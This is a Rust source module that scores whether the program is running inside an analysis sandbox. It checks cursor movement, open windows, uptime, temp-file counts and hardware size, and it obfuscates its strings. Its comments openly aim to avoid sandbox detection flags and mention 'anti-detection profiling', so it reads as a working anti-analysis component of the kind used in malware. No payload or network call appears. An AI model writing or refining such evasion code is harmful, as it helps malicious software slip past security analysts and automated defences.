use anyhow::Result;
use log::{info, warn};
use string_crypt::enc_str;

#[derive(Debug, Default)]
pub struct SandboxMetrics {
    pub mouse_movement_score: u8,
    pub desktop_richness_score: u8,
    pub uptime_score: u8,
    pub hardware_plausibility_score: u8,
}

#[cfg(windows)]
pub fn check_mouse_movement() -> u8 {
    use winapi::um::winuser::GetCursorPos;
    use winapi::shared::windef::POINT;

    // Take 4 samples over ~1 second total.  Previously this was 20 × 500 ms = 10 s,
    // which stalled startup long enough to be trivially detected by timing analysis.
    // 4 × 250 ms = 1 s is still sufficient to detect a static/automated cursor
    // while keeping the window short enough to avoid timing-based sandbox flags.
    let mut positions = Vec::with_capacity(4);
    let mut total_distance = 0.0f64;

    for _ in 0..4 {
        let mut pt = POINT { x: 0, y: 0 };
        unsafe {
            if GetCursorPos(&mut pt) != 0 {
                positions.push((pt.x, pt.y));
            }
        }
        std::thread::sleep(std::time::Duration::from_millis(250));
    }

    let unique_positions: std::collections::HashSet<_> = positions.iter().copied().collect();

    for i in 1..positions.len() {
        let dx = (positions[i].0 - positions[i - 1].0) as f64;
        let dy = (positions[i].1 - positions[i - 1].1) as f64;
        total_distance += (dx * dx + dy * dy).sqrt();
    }

    if unique_positions.len() < 2 || total_distance < 5.0 {
        20
    } else if unique_positions.len() < 4 || total_distance < 50.0 {
        10
    } else {
        0
    }
}

#[cfg(not(windows))]
pub fn check_mouse_movement() -> u8 {
    0 // Placeholder for Linux X11 tracking
}

#[cfg(windows)]
pub fn check_desktop_windows() -> u8 {
    use winapi::um::winuser::{EnumWindows, GetWindowTextLengthW, IsWindowVisible};
    use winapi::shared::minwindef::{BOOL, LPARAM, TRUE, FALSE};
    use winapi::shared::windef::HWND;
    
    unsafe extern "system" fn enum_windows_proc(hwnd: HWND, lparam: LPARAM) -> BOOL {
        let count = &mut *(lparam as *mut usize);
        if IsWindowVisible(hwnd) != 0 {
            let length = GetWindowTextLengthW(hwnd);
            if length > 0 {
                *count += 1;
            }
        }
        TRUE
    }
    
    let mut count: usize = 0;
    unsafe {
        EnumWindows(Some(enum_windows_proc), &mut count as *mut _ as LPARAM);
    }
    
    if count < 3 {
        20
    } else if count < 8 {
        10
    } else {
        0
    }
}

#[cfg(not(windows))]
pub fn check_desktop_windows() -> u8 {
    0 // Placeholder for Linux X11 window enum
}

#[cfg(windows)]
pub fn check_system_uptime_artifacts() -> u8 {
    use winapi::um::sysinfoapi::GetTickCount64;
    
    let uptime_ms = unsafe { GetTickCount64() };
    let uptime_mins = uptime_ms / 60000;
    let uptime_hours = uptime_mins / 60;
    
    let mut temp_files_count = 0;
    if let Ok(temp_dir) = std::env::temp_dir().read_dir() {
        temp_files_count = temp_dir.count();
    }
    
    if uptime_mins < 10 && temp_files_count < 5 {
        20
    } else if uptime_hours < 24 || temp_files_count < 20 {
        10
    } else {
        0
    }
}

#[cfg(not(windows))]
pub fn check_system_uptime_artifacts() -> u8 {
    let mut temp_files_count = 0;
    if let Ok(temp_dir) = std::fs::read_dir("/tmp") {
        temp_files_count = temp_dir.count();
    }
    
    let uptime_str = std::fs::read_to_string("/proc/uptime").unwrap_or_default();
    let uptime_secs: f64 = uptime_str.split_whitespace().next().unwrap_or("0").parse().unwrap_or(0.0);
    let uptime_mins = uptime_secs / 60.0;
    let uptime_hours = uptime_mins / 60.0;
    
    if uptime_mins < 10.0 && temp_files_count < 5 {
        20
    } else if uptime_hours < 24.0 || temp_files_count < 20 {
        10
    } else {
        0
    }
}

#[cfg(windows)]
pub fn check_hardware_plausibility() -> u8 {
    use winapi::um::fileapi::GetDiskFreeSpaceExW;
    use winapi::um::sysinfoapi::{GlobalMemoryStatusEx, GetSystemInfo, SYSTEM_INFO, MEMORYSTATUSEX};
    use winapi::shared::minwindef::TRUE;
    
    let mut total_bytes: u64 = 0;
    let mut free_bytes_available: u64 = 0;
    let mut total_free_bytes: u64 = 0;
    
    let c_drive: Vec<u16> = std::str::from_utf8(&enc_str!("C:\\")).unwrap().encode_utf16().chain(std::iter::once(0)).collect();
    
    unsafe {
        GetDiskFreeSpaceExW(
            c_drive.as_ptr(),
            &mut free_bytes_available as *mut _ as *mut winapi::shared::ntdef::ULARGE_INTEGER,
            &mut total_bytes as *mut _ as *mut winapi::shared::ntdef::ULARGE_INTEGER,
            &mut total_free_bytes as *mut _ as *mut winapi::shared::ntdef::ULARGE_INTEGER,
        );
    }
    
    let mut mem_status: MEMORYSTATUSEX = unsafe { std::mem::zeroed() };
    mem_status.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
    unsafe {
        GlobalMemoryStatusEx(&mut mem_status);
    }
    
    let mut sys_info: SYSTEM_INFO = unsafe { std::mem::zeroed() };
    unsafe {
        GetSystemInfo(&mut sys_info);
    }
    
    let disk_gb = total_bytes / (1024 * 1024 * 1024);
    let ram_gb = mem_status.ullTotalPhys / (1024 * 1024 * 1024);
    let cpus = sys_info.dwNumberOfProcessors;
    
    let mut below_threshold_count = 0;
    if disk_gb <= 60 { below_threshold_count += 1; }
    if ram_gb <= 4 { below_threshold_count += 1; }
    if cpus <= 2 { below_threshold_count += 1; }
    
    match below_threshold_count {
        0 => 0,
        1 => 10,
        _ => 20,
    }
}

#[cfg(not(windows))]
pub fn check_hardware_plausibility() -> u8 {
    let mut below_threshold_count = 0;
    
    let mut disk_gb = 0;
    unsafe {
        let mut stat: libc::statvfs = std::mem::zeroed();
        if libc::statvfs(b"/\0".as_ptr() as *const libc::c_char, &mut stat) == 0 {
            disk_gb = (stat.f_blocks as u64 * stat.f_frsize as u64) / (1024 * 1024 * 1024);
        }
    }
    if disk_gb <= 60 { below_threshold_count += 1; }
    
    let mut ram_gb = 0;
    if let Ok(meminfo) = std::fs::read_to_string("/proc/meminfo") {
        if let Some(mem_total_line) = meminfo.lines().find(|l| l.starts_with("MemTotal:")) {
            if let Some(kb_str) = mem_total_line.split_whitespace().nth(1) {
                if let Ok(kb) = kb_str.parse::<u64>() {
                    ram_gb = kb / (1024 * 1024);
                }
            }
        }
    }
    if ram_gb <= 4 { below_threshold_count += 1; }
    
    let cpus = unsafe { libc::sysconf(libc::_SC_NPROCESSORS_ONLN) };
    if cpus <= 2 { below_threshold_count += 1; }
    
    match below_threshold_count {
        0 => 0,
        1 => 10,
        _ => 20,
    }
}

/// FR-5: Combined Heuristic Scoring and Decision Framework
pub fn sandbox_probability_score(metrics: &SandboxMetrics) -> u32 {
    let mut score = 0;
    
    // Weights assignment based on spoofing difficulty
    score += (metrics.mouse_movement_score as u32) * 5; // Very hard to spoof perfectly
    score += (metrics.desktop_richness_score as u32) * 3;
    score += (metrics.uptime_score as u32) * 2;
    score += (metrics.hardware_plausibility_score as u32) * 1; // Easily spoofed by configs
    
    score = std::cmp::min(score, 100);
    score
}

pub fn evaluate_sandbox() -> Result<bool> {
    let metrics = SandboxMetrics {
        mouse_movement_score: check_mouse_movement(),
        desktop_richness_score: check_desktop_windows(),
        uptime_score: check_system_uptime_artifacts(),
        hardware_plausibility_score: check_hardware_plausibility(),
    };
    
    let score = sandbox_probability_score(&metrics);
    info!("Combined Sandbox Probability Score: {}", score);
    
    if score > 60 {
        warn!("High probability of sandbox (Score {} > 60)", score);
        Ok(true) // Sandbox detected
    } else if score > 30 {
        warn!("Moderate Sandbox Probability (Score {}). Proceeding with caution using enhanced anti-detection profiling.", score);
        Ok(false)
    } else {
        Ok(false) // Safe
    }
}
